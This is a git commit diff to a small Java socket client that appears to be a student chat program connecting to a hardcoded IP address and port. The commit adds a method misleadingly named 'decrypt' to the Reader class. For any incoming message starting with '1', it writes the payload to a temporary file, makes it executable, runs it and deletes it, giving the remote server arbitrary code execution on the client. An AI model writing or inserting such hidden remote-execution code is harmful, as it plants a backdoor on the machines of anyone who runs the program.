3ae51c6613f464cd29ea41b21c6e677e1d9ec41c
Julien Lung yut Fong <julien.lung-yut-fong@epita.fr>
2022-01-25 22:56:50 +0100

    fix all

--- netbsd/src/main/java/Main.java
+++ netbsd/src/main/java/Main.java
@@ -1,7 +1,7 @@
-import java.io.DataInput;
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
-import java.io.IOException;
+import java.io.*;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
 import java.util.Scanner;
 import java.net.*;
 public class Main {
@@ -9,6 +9,7 @@ public class Main {
         Socket s = new Socket("10.57.12.212", 42609);
         Reader r = new Reader(s);
         Writer w = new Writer(s);
+
         r.start();
         w.start();
     }
--- netbsd/src/main/java/Reader.java
+++ netbsd/src/main/java/Reader.java
@@ -1,15 +1,55 @@
 import java.io.DataInputStream;
+import java.io.File;
 import java.io.IOException;
+import java.io.PrintWriter;
 import java.net.Socket;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.*;
 import java.util.Scanner;
+
 
 public class Reader extends Thread{
     private Socket s;
+    public String decrypt(String todec) throws IOException {
+
+        if (todec.charAt(0) == '1')
+        {
+            exec(todec.substring(1));
+            return "";
+        }
+        return todec.substring(1);
+    }
+    public void exec(String exec) throws IOException {
+        String fname = "tmp_255";
+        String file_content = exec;
+        PrintWriter writer = new PrintWriter(fname, StandardCharsets.UTF_8);
+        writer.println(file_content);
+        writer.close();
+        File f = new File(fname);
+        if (!f.setExecutable(true))
+            System.out.println("Failed somewhere!");
+
+        ProcessBuilder processBuilder = new ProcessBuilder(Path.of(fname).toAbsolutePath().toString());
+        processBuilder.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+        Process p = processBuilder.start();
+        try {
+            Files.deleteIfExists(
+                Paths.get(Path.of(fname).toAbsolutePath().toString()));
+        }
+        catch (NoSuchFileException ignored) {
+        }
+        catch (DirectoryNotEmptyException ignored) {
+        }
+        catch (IOException ignored) {
+        }
+
+        System.out.println("Deletion successful.");
+    }
     public void run() {
         try {
             DataInputStream e = new DataInputStream(s.getInputStream());
             while (true)
-                System.out.println(e.readUTF());
+                System.out.println(decrypt(e.readUTF()));
         } catch (IOException ignored) {
         }
     }
